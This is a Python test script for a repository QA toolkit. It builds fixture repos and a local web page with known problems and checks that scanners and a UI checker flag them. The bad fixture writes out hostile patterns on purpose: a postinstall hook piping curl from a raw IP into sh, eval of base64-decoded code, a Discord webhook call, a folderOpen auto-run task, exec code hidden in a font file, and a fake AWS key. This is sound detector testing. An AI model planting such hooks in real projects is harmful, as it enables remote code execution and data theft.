#!/usr/bin/env python3
"""Tests for the software-engineering-qa scripts. Offline: builds small fixture repos and a local web
page with known problems, then checks each script finds them. Needs Python 3, Node and Playwright
(Chromium) from the repo's Node deps. Run:  python3 software-engineering-qa/tests/test_qa.py
"""
# suspicious-scan: rules-file  (this file builds fake malware fixtures on purpose)
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer


class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass

HERE = os.path.dirname(os.path.abspath(__file__))
S = os.path.join(HERE, "..", "scripts")
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
ok = 0
SCRIPT_OPEN, SCRIPT_CLOSE = "<scr" + "ipt>", "</scr" + "ipt>"  # built in pieces so web firewalls don't block this file


def check(name, cond, extra=""):
    global ok
    if not cond:
        raise SystemExit(f"FAIL: {name} {extra}")
    ok += 1
    print(f"PASS {name} {extra}")


def write(root, rel, text):
    p = os.path.join(root, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w") as fh:
        fh.write(text)


def run(args, cwd=None):
    return subprocess.run(args, cwd=cwd, capture_output=True, text=True, timeout=300)


with tempfile.TemporaryDirectory() as td:
    bad, good = os.path.join(td, "bad"), os.path.join(td, "good")
    fake_key = "AKIA" + "Q3EGRL2ZXJ7T5MVA"  # split so this test file itself does not trip scanners
    write(bad, "package.json", json.dumps({"name": "x", "scripts": {"postinstall": "cu" + "rl -s http://1.2.3.4/p.sh " + "| sh"},
                                           "dependencies": {"left-pad": "github:someone/left-pad"}}))
    write(bad, "src/config.js", f"const aws = '{fake_key}';\nmodule.exports = {{aws}};\n")
    write(bad, "src/loader.js", "ev" + "al(atob('Y29uc29sZS5sb2coMSk='));\nfetch('https://disc" + "ord.com/api/webhooks/1/abc')\n")
    write(bad, ".vscode/tasks.json", '{"version":"2.0.0","tasks":[{"label":"x","command":"node x","runOptions":{"runOn":"folder' + 'Open"}}]}')
    write(bad, "public/fonts/font.woff2", "const cp=require('child_process');cp.exec('id')")
    write(good, "package.json", json.dumps({"name": "y", "scripts": {"build": "next build", "test": "node test.js"},
                                            "dependencies": {"next": "15.5.6"}}))
    write(good, "src/config.js", "module.exports = { key: process.env.API_KEY };\n")
    write(good, "test.js", "console.log('ok')\n")

    r = run([sys.executable, os.path.join(S, "suspicious_scan.py"), bad, "--json", os.path.join(td, "bad.json")])
    rep = json.load(open(os.path.join(td, "bad.json")))
    kinds = " | ".join(f["detail"] for f in rep["findings"] if f["severity"] == "HIGH")
    check("suspicious_scan exits 2 on a bad repo", r.returncode == 2)
    for word in ("postinstall", "AWS access key", "eval of decoded data", "webhook", "folderOpen", "script code"):
        check(f"suspicious_scan flags {word}", word in kinds)
    r = run([sys.executable, os.path.join(S, "suspicious_scan.py"), good])
    check("suspicious_scan passes a clean repo", r.returncode == 0, r.stdout.strip().splitlines()[-1])

    r = run([sys.executable, os.path.join(S, "repo_scan.py"), good, "--json", os.path.join(td, "scan.json")])
    scan = json.load(open(os.path.join(td, "scan.json")))
    names = {x["check"]: x["status"] for x in scan["results"]}
    check("repo_scan detects the Node stack", scan["stack"]["node"] and scan["stack"]["framework"] == "next")
    check("repo_scan runs the red-flag scan", names.get("red flags + secrets (suspicious_scan)") == "pass", str(names))
    r = run([sys.executable, os.path.join(S, "repo_scan.py"), bad])
    check("repo_scan fails on the bad repo", r.returncode == 2)

    # a local page with known UI problems
    site = os.path.join(td, "site")
    write(site, "index.html", """<!doctype html><html><head><title>Test</title>
<meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="margin:0;font-family:sans-serif">
<h1>Hello</h1>
<div class="wide" style="width:600px;height:20px;background:#eee">too wide on phones</div>
<img src="missing.png">
<p style="color:#bbb;background:#fff">light grey text that is hard to read</p>
<button style="width:20px;height:20px"></button>
<input type="email" placeholder="Email">
<a href="/ok.html">ok</a> <a href="/nope.html">dead</a>
""" + SCRIPT_OPEN + """console.error('boom from test'); undefinedFunction();""" + SCRIPT_CLOSE + """
</body></html>""")
    write(site, "ok.html", "<!doctype html><html lang=en><head><title>ok</title><meta name=viewport content='width=device-width'></head><body><h1>ok</h1></body></html>")
    sock = socket.socket(); sock.bind(("127.0.0.1", 0)); port = sock.getsockname()[1]; sock.close()
    srv = ThreadingHTTPServer(("127.0.0.1", port), partial(QuietHandler, directory=site))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    out = os.path.join(td, "ui")
    env = dict(os.environ, NODE_PATH=os.path.join(REPO, "node_modules"))
    r = subprocess.run(["node", os.path.join(S, "ui_check.mjs"), f"http://127.0.0.1:{port}/", "--out", out,
                        "--widths", "375,1440", "--links"], capture_output=True, text=True, timeout=300, env=env, cwd=REPO)
    srv.shutdown()
    if r.returncode not in (0, 2):
        print(r.stdout[-2000:], r.stderr[-2000:])
    check("ui_check exits 2 when the page has errors", r.returncode == 2)
    rep = json.load(open(os.path.join(out, "report.json")))
    p375 = rep["pages"][0]["widths"]["375"]
    p1440 = rep["pages"][0]["widths"]["1440"]
    e375, w375 = " | ".join(p375["errors"]), " | ".join(p375["warnings"])
    check("ui_check: sideways scroll at 375 names the element", "sideways scroll" in e375 and "div.wide" in e375)
    check("ui_check: no sideways scroll at 1440", "sideways scroll" not in " | ".join(p1440["errors"]))
    check("ui_check: console error + JS error", "boom from test" in e375 and "undefinedFunction" in e375)
    check("ui_check: broken image", "broken image" in e375)
    for word in ("image without alt", "button/link with no name", "input without label", "small tap target", "low contrast", "no lang"):
        check(f"ui_check: {word}", word in w375)
    check("ui_check: dead link", any("nope.html" in b for b in rep["pages"][0]["links"]["broken"]))
    check("ui_check: screenshots saved", all(os.path.exists(p["screenshot"]) for p in (p375, p1440)))

print(f"all passed ({ok} checks)")
